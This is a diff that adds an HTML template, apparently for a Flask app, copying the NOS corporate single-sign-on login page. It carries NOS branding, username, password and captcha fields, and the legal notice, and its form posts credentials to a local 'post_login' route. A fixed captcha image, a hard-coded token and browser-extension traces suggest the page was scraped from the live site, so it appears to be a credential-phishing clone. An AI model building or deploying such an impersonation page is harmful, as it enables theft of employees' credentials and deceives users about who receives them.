@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title trspan="authPortal">NOS Single-Sign-On</title>
+
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta http-equiv="Content-Script-Type" content="text/javascript">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <link rel="stylesheet" type="text/css" href="{{url_for('static', filename='fontcustom.css')}}">
+  <link rel="stylesheet" type="text/css" href="{{url_for('static', filename='aZoSansWeb.css')}}">
+  <link rel="stylesheet" type="text/css" href="{{url_for('static', filename='main.css')}}">
+  <link rel="stylesheet" type="text/css" href="{{url_for('static', filename='portal.css')}}">
+
+
+  <link href="https://auth.co.nos.pt/static/common/favicon.ico" rel="icon" type="image/vnd.microsoft.icon"
+    sizes="16x16 32x32 48x48 64x64 128x128">
+  <link href="https://auth.co.nos.pt/static/common/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon"
+    sizes="16x16 32x32 48x48 64x64 128x128">
+
+
+  <!-- Load javascript common to all skins -->
+  <script type="text/javascript" src="{{url_for('static', filename='jquery.min.js')}}"></script>
+  <script type="text/javascript" src="{{url_for('static', filename='jquery.cookie.min.js')}}"></script>
+  <script type="application/init">
+ {
+ "displaytab":"",
+ "choicetab":"",
+ "login":"",
+ "newwindow":0,
+ "appslistorder":"",
+ "activeTimer":0,
+ "pingInterval":0,
+ "trOver":{"en":{"PE5":"Wrong credentials","authPortal":"NOS Single-Sign-On","PE9":"_hide_"},"pt":{"PE5":"Senha ou utilizador incorretos","authPortal":"NOS Single-Sign-On","PE9":"_hide_"},"all":{"PE9":""}},
+ "enablePasswordDisplay":0,
+ "dontStorePassword":0,
+ "scrollTop":400,
+ "sameSite":"None"
+ }
+ </script>
+
+
+  <script type="text/javascript" src="{{url_for('static', filename='skin.min.js')}}"></script>
+  <script type="text/javascript" src="{{url_for('static', filename='portal.js')}}"></script>
+  <script type="text/javascript" src="{{url_for('static', filename='bootstrap.min.js')}}"></script>
+
+
+</head>
+
+<body data-new-gr-c-s-check-loaded="8.906.0" data-gr-ext-installed="">
+
+
+
+
+  <div class="page">
+
+    <div class="page-content">
+
+      <img src="{{url_for('static', filename='NOS-logo-black.svg')}}" class="page-logo">
+
+      <!--
+      
+      <div class="message message-warning alert">9</div>
+      
+    -->
+
+
+
+
+
+      <form id="lform" action="post_login" method="post" class="login" role="form" data-bitwarden-watching="1">
+        <input type="hidden" name="url" value="">
+        <input type="hidden" name="timezone" value="1">
+        <input type="hidden" name="skin" value="newnos">
+        <input id="token" type="hidden" name="token" value="1687973081_39993">
+        <div class="form">
+          <div class="form-group">
+            <label for="userfield" class="login__form__field__label" trspan="username">Username:</label>
+            <input id="userfield" name="user" type="text" trplaceholder="usernamePlaceholder"
+              class="login__form__field__input" required="" placeholder="E.g.: u10054117 or nsurname">
+          </div>
+          <div class="form-group">
+            <label for="form_input_password" class="login__form__field__label" trspan="password">Password:</label>
+            <input name="password" type="password" class="login__form__field__input login__form__field__input--warning"
+              id="form_input_password" required="">
+          </div>
+          <script type="text/javascript" src="{{url_for('static', filename='captcha.min.js')}}"></script>
+          <div class="form-group">
+            <label for="captchafield" trspan="captcha">Captcha</label>
+            <input id="captchafield" type="text" name="captcha" size="6" required="" aria-required="true"
+              autocomplete="off">
+          </div>
+          <div class="form-group captcha-image">
+            <img class="renewcaptchaclick" src="{{url_for('static', filename='arrow_refresh.png')}}" alt="Renew Captcha"
+              title="Renew Captcha">
+            <img id="captcha"
+              src="data:image/png;base64,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"
+              class="img-thumbnail">
+          </div>
+          <div id="errormsg">
+            <div class="message message-warning alert alert-warning" style="display: none;"><span
+                trmsg="9">_hide_</span>
+            </div>
+          </div>
+          <button type="submit" class="c-button" trspan="enter">Enter</button>
+        </div>
+        <div class="actions">
+          <div class="login__terms" trspan="loginTerms">
+            <p><small>Access to and
+                use of this application/platform, and respective information processed
+                therein, are strictly limited to professional purposes and only by
+                persons expressly authorized for that purpose, under the terms and in
+                accordance with the NOS security policies and standards that must be of
+                the knowledge of users. Any unauthorized access or use may lead to the
+                opening of a security incident and constitute an offense, subject to
+                disciplinary, civil and criminal sanctions.</small></p>
+            <p><small>The
+                information that the user is preparing to access is an asset under the
+                responsibility of NOS, and the user is obliged to comply with the rules
+                regarding the classification and management of information and the
+                privacy of personal data, protecting the information according to the
+                level of classification assigned.</small></p>
+            <p><small>Access
+                credentials (username and respective password) are personal and
+                non-transferable and must be kept strictly confidential. Access to the
+                application/platform may be monitored by the company, for security
+                reasons, and in accordance with NOS security policies and standards and
+                the legislation in force.</small></p>
+            <p><small>The transmission,
+                communication, sharing or disclosure of access credentials is expressly
+                prohibited, and the user assumes full responsibility for not disclosing
+                these credentials. Copying, printing, manipulating, exporting and
+                sending by any electronic means of information to which the user has
+                access through this application is not authorized, unless such access
+                and use of information takes place within the scope of the performance
+                of its functions and for purposes strictly professional.</small></p>
+            <p><small>It is mandatory to log out of this application/platform at the end of each work period.</small>
+            </p>
+          </div>
+        </div>
+
+      </form>
+
+      <div id="footer" class="container">
+        <div class="row">
+          <div class="col-md-2"></div>
+          <div class="col-md-8 col-10">
+
+          </div>
+
+          <div class="col-md-2 col-2 text-right">
+            <span id="languages"><img class="langicon" src="{{url_for('static', filename='pt.png')}}" title="pt"
+                alt="[pt]"><img class="langicon active" src="{{url_for('static', filename='en.png')}}" title="en"
+                alt="[en]"></span>
+          </div>
+
+        </div>
+      </div>
+
+      <!-- Constants -->
+      <script type="text/JavaScript" src="{{url_for('static', filename='psgi.js')}}"></script>
+
+
+
+
+    </div>
+
+  </div>
+
+</body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration>
+
+</html>
